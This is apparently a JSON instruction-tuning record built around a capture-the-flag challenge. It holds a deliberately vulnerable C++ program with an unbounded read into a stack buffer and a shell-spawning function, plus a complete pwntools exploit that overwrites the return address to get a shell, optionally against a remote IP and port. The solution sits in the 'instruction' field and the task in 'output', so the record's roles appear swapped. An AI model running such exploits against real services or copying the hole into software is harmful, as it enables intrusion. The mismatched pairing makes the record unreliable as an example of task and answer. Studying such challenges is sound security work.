{
    "instruction": "It's pretty simple to notice the buffer overflow - `main` declares a buffer of 1024 bytes, but does not limit the input read into it. We just need to overflow the buffer, override the return address of `main` with the address of `spawn_shell` and we're done.\n\n\nfrom pwn import *\nimport argparse\nimport os\nLOCAL_PATH = \"./1996\"\ndef get_process(is_remote = False):\n    if is_remote:\n        return remote(\"35.207.132.47\", 22227)\n    else:\n        return process(LOCAL_PATH)\ndef send_payload(proc, payload):\n    proc.sendlineafter(\"Which environment variable do you want to read? \", payload)\ndef get_overflow_offset():\n    os.system(\"echo ~/core/core_dump > /proc/sys/kernel/core_pattern\")\n    os.system(\"rm core.* > /dev/null\")\n    proc = process(LOCAL_PATH)\n    payload = cyclic(1200, n = 8)\n    send_payload(proc, payload)\n    proc.wait()\n    offset = cyclic_find(proc.corefile.fault_addr, n = 8)\n    log.info(\"Overflow offset: {}\".format(offset))\n    return offset\nparser = argparse.ArgumentParser()\nparser.add_argument(\"-r\", \"--remote\", help=\"Execute on remote server\", action=\"store_true\")\nargs = parser.parse_args()\ne = ELF(LOCAL_PATH)\ncontext.binary = e.path\nlog.info(\"Address of spawn_shell(): 0x{:02X}\".format(e.symbols[\"_Z11spawn_shellv\"]))\noffset = get_overflow_offset()\np = get_process(args.remote)\npayload = fit({offset: p64(e.symbols[\"_Z11spawn_shellv\"])})\nsend_payload(p, payload)\np.interactive()\n",
    "input": "It's 1996 all over again!\n\n\n// compile with -no-pie -fno-stack-protector\n#include <iostream>\n#include <unistd.h>\n#include <stdlib.h>\nusing namespace std;\nvoid spawn_shell() {\n    char* args[] = {(char*)\"/bin/bash\", NULL};\n    execve(\"/bin/bash\", args, NULL);\n}\nint main() {\n    char buf[1024];\n    cout << \"Which environment variable do you want to read? \";\n    cin >> buf;\n    cout << buf << \"=\" << getenv(buf) << endl;\n}\n",
    "output": "Execute the buffer overflow to spawn a shell."
}
